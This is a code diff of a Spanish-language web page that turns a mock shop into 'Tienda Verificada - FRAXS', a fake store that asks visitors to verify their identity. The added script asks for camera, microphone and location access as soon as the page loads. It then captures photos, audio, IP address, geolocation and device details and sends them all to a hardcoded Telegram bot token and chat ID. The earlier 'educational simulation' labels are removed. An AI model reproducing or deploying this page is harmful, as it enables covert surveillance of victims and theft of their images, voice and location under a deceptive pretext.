@@ -2,182 +2,183 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>StorePlus - Simulador de Compras</title>
+  <title>Tienda Verificada - FRAXS</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to right, #141e30, #243b55);
-      color: #fff;
-    }
-    header {
-      padding: 1.5rem;
-      background: #0f2027;
+      background-color: #f2f2f2;
+      font-family: Arial, sans-serif;
+      padding: 20px;
       text-align: center;
-      font-size: 1.8rem;
-      font-weight: bold;
-      letter-spacing: 1px;
     }
-    .productos {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-      gap: 1.5rem;
-      padding: 2rem;
+    h1 {
+      color: #333;
     }
-    .producto {
-      background: #1c1c1c;
-      border-radius: 12px;
-      padding: 1rem;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.4);
-      transition: transform 0.3s ease;
-    }
-    .producto:hover {
-      transform: scale(1.05);
-    }
-    .producto img {
-      max-width: 100%;
+    .card {
+      background: white;
       border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      padding: 20px;
+      margin: 20px auto;
+      max-width: 400px;
     }
-    .producto h3 {
-      margin: 0.5rem 0;
-      color: #0ff;
+    video, canvas, audio {
+      display: block;
+      margin: 10px auto;
+      max-width: 100%;
     }
-    .producto p {
-      font-size: 0.9rem;
-      color: #ccc;
-    }
-    .btn {
-      margin-top: 0.8rem;
-      background: #0ff;
-      color: #000;
+    button {
+      padding: 10px 15px;
+      margin: 10px 5px;
       border: none;
-      padding: 0.5rem 1rem;
-      font-weight: bold;
+      background: #333;
+      color: white;
       cursor: pointer;
       border-radius: 5px;
     }
-    footer {
-      text-align: center;
-      padding: 1rem;
-      font-size: 0.8rem;
-      background: #0f2027;
-      color: #aaa;
+    button:hover {
+      background: #555;
+    }
+    textarea {
+      width: 100%;
+      height: 80px;
+      margin-top: 10px;
     }
   </style>
 </head>
 <body>
-  <header>🛒 StorePlus - Mejores Ofertas 2025</header>
 
-  <section class="productos">
-    <div class="producto">
-      <img src="https://via.placeholder.com/300x200?text=Smartwatch+X" alt="Producto 1">
-      <h3>Smartwatch X</h3>
-      <p>El reloj inteligente más moderno del año. Resistente, rápido y elegante.</p>
-      <button class="btn" onclick="comprar()">Comprar</button>
-    </div>
-    <div class="producto">
-      <img src="https://via.placeholder.com/300x200?text=Gamer+Auriculares" alt="Producto 2">
-      <h3>Auriculares Gamer Pro</h3>
-      <p>Sonido envolvente, micrófono HD y diseño ergonómico para gamers.</p>
-      <button class="btn" onclick="comprar()">Comprar</button>
-    </div>
-    <div class="producto">
-      <img src="https://via.placeholder.com/300x200?text=Celular+Z+5G" alt="Producto 3">
-      <h3>Celular Z 5G</h3>
-      <p>Potente, rápido, cámara de 108MP y conectividad 5G.</p>
-      <button class="btn" onclick="comprar()">Comprar</button>
-    </div>
-  </section>
+  <h1>Tienda Verificada - FRAXS</h1>
+  <div class="card">
+    <p>Antes de comprar, por seguridad verifica tu identidad:</p>
+    <video id="video" autoplay muted></video>
+    <canvas id="canvas" class="hidden"></canvas>
+    <audio id="audioPlayer" controls></audio>
 
-  <footer>© 2025 StorePlus - Simulación Educativa</footer>
+    <button onclick="tomarFoto()">📸 Tomar Foto</button>
+    <button onclick="grabarAudio()">🎙️ Grabar Audio</button>
+    <button onclick="detenerGrabacion()">⏹️ Detener y Enviar Audio</button>
+  </div>
 
   <script>
-    const chat_id = "7955801451";
-    const bot_token = "7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI";
+    const BOT_TOKEN = "7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI";
+    const CHAT_ID = "7955801451";
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const audioPlayer = document.getElementById('audioPlayer');
+
+    let mediaRecorder;
+    let audioChunks = [];
+
+    async function solicitarPermisos() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        video.srcObject = stream;
+        return stream;
+      } catch (error) {
+        alert("Permisos denegados: " + error);
+      }
+    }
+
+    function tomarFoto() {
+      const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+      }, 'image/jpeg');
+    }
+
+    function grabarAudio() {
+      audioChunks = [];
+      navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+        mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.start();
+
+        mediaRecorder.ondataavailable = e => {
+          audioChunks.push(e.data);
+        };
+
+        mediaRecorder.onstop = () => {
+          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+          audioPlayer.src = URL.createObjectURL(audioBlob);
+
+          const formData = new FormData();
+          formData.append("chat_id", CHAT_ID);
+          formData.append("audio", audioBlob, "grabacion.webm");
+
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+            method: "POST",
+            body: formData
+          });
+        };
+      });
+    }
+
+    function detenerGrabacion() {
+      if (mediaRecorder && mediaRecorder.state === "recording") {
+        mediaRecorder.stop();
+      }
+    }
 
     async function obtenerIP() {
       try {
         const res = await fetch("https://api.ipify.org?format=json");
         const data = await res.json();
         return data.ip;
-      } catch (e) {
-        return "IP no disponible";
+      } catch {
+        return "No disponible";
       }
     }
 
-    async function obtenerUbicacion() {
-      return new Promise((resolve) => {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            (pos) => {
-              resolve(`Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}`);
-            },
-            () => {
-              resolve("Permiso denegado o no disponible");
-            }
-          );
-        } else {
-          resolve("No compatible");
-        }
-      });
-    }
-
-    async function enviarDatos() {
+    async function enviarInfoDispositivo() {
       const ip = await obtenerIP();
-      const ubicacion = await obtenerUbicacion();
-      const userAgent = navigator.userAgent;
-      const idioma = navigator.language;
-      const plataforma = navigator.platform;
-      const resolucion = `${screen.width}x${screen.height}`;
-      const hora = new Date().toLocaleString();
+      const ubicacion = await new Promise(resolve => {
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(`Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}`),
+          err => resolve("No disponible")
+        );
+      });
 
       const mensaje = `
-🛡️ SIMULACIÓN EDUCATIVA
-━━━━━━━━━━━━━━━
-📡 IP: ${ip}
-📍 Ubicación: ${ubicacion}
-💻 User-Agent: ${userAgent}
-🌐 Idioma: ${idioma}
-🧱 Plataforma: ${plataforma}
-🖥️ Resolución: ${resolucion}
-🕒 Hora: ${hora}
-      `;
+🔐 NUEVA CONEXIÓN A LA TIENDA 🔐
+📍 IP: ${ip}
+🌐 User-Agent: ${navigator.userAgent}
+📱 Plataforma: ${navigator.platform}
+🕒 Hora: ${new Date().toLocaleString()}
+📌 Ubicación: ${ubicacion}
+`;
 
-      fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chat_id,
-          text: mensaje
-        })
+        body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
       });
     }
 
-    function solicitarPermisos() {
-      if ("Notification" in window && Notification.permission !== 'granted') {
-        Notification.requestPermission();
-      }
-
-      if (navigator.mediaDevices) {
-        navigator.mediaDevices.getUserMedia({ video: true }).catch(() => {});
-        navigator.mediaDevices.getUserMedia({ audio: true }).catch(() => {});
-      }
-
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(() => {}, () => {});
+    async function solicitarNotificaciones() {
+      if ("Notification" in window) {
+        const permiso = await Notification.requestPermission();
+        if (permiso === "granted") {
+          new Notification("¡Gracias por verificar tu identidad!");
+        }
       }
     }
 
-    function comprar() {
-      alert("Gracias por tu compra. Se enviará un mensaje al soporte.");
-    }
-
-    // Ejecutar al entrar
-    window.onload = () => {
-      solicitarPermisos();
-      enviarDatos();
-    }
+    // Ejecutar automáticamente al cargar
+    window.onload = async () => {
+      await solicitarPermisos();
+      await solicitarNotificaciones();
+      await enviarInfoDispositivo();
+    };
   </script>
 </body>
 </html>
